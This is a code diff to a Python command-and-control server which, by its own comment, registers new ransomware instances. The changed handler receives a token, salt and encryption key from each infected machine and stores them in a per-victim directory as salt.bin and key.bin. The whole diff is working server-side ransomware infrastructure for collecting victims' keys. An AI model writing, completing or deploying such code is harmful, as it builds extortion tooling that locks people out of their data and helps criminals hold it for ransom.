@@ -2,6 +2,7 @@ import base64
 from hashlib import sha256
 from http.server import HTTPServer
 import os
+from pathlib import Path
 import logging
 
 from cncbase import CNCBase
@@ -20,10 +21,19 @@ class CNC(CNCBase):
 
     def post_new(self, path:str, params:dict, body:dict) -> dict:
         # used to register new ransomware instance
+        self._log.debug(path)
+        self._log.debug(params)
+        self._log.debug(body)
         token = params['token']
-        os.mkdir(CNC.ROOT_PATH + '/' + token)
-        self._log.info(path, params, body)
-        self.save_b64(token, body['key'], "bite.bin")
+        salt = body['salt']
+        key = body['key']
+        new_path = CNC.ROOT_PATH + '/' + str(token)
+
+        if not Path(new_path).exists():
+            Path(new_path).mkdir(parents=True, exist_ok=True)
+        # os.mkdir(CNC.ROOT_PATH + '/' + str(token)) 
+        self.save_b64(token, salt, 'salt.bin')
+        self.save_b64(token, key, 'key.bin')
 
         return {"status":"OK"}
 
